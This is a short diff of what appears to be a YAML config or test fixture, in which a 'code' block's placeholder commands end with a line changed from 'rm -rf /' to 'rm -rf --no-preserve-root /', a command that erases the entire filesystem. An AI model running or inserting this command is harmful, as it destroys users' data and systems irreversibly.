@@ -52,4 +52,4 @@ bla:
         code: |
             echo "bla bla bla"
             time
-            rm -rf /
+            rm -rf --no-preserve-root /
